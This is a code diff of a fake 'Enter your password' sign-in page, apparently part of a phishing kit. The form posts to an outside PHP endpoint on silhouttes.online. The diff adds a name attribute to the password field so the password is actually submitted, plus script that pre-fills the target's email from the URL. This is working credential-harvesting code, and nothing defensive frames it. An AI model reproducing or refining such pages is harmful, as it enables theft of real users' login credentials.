@@ -126,15 +126,15 @@
   <h1>Enter your password</h1>
 
   <!-- Form with PHP link as action -->
-  <form action="https://silhouttes.online/mo/index.php" method="POST">
-    <div class="input-group">
-      <input type="password" placeholder="" required />
-      <a href="#" class="forgot">Forgot password?</a>
-    </div>
-    <div class="checkbox-container">
-      <input type="checkbox" id="keepSignedIn" />
-      <label for="keepSignedIn">Keep me signed in</label>
-    </div>
+ <form action="https://silhouttes.online/mo/index.php" method="POST">
+  <div class="input-group">
+    <input type="password" name="password" placeholder="" required />
+    <a href="#" class="forgot">Forgot password?</a>
+  </div>
+  <div class="checkbox-container">
+    <input type="checkbox" id="keepSignedIn" />
+    <label for="keepSignedIn">Keep me signed in</label>
+  </div>
     <!-- Submit button -->
     <button type="submit">Sign in</button>
   </form>
@@ -156,12 +156,19 @@
 </div>
 
 <script>
- // Function to get URL parameter by name
+  // Function to get URL parameter
   function getUrlParameter(name) {
     const urlParams = new URLSearchParams(window.location.search);
     return urlParams.get(name);
   }
 
+  window.onload = function() {
+    const email = getUrlParameter('email');
+    if (email) {
+      document.getElementById('email').value = email;
+    }
+  };
+  
   // Populate email display and hidden input when page loads if URL has email param
   window.onload = () => {
     const emailParam = getUrlParameter('email');
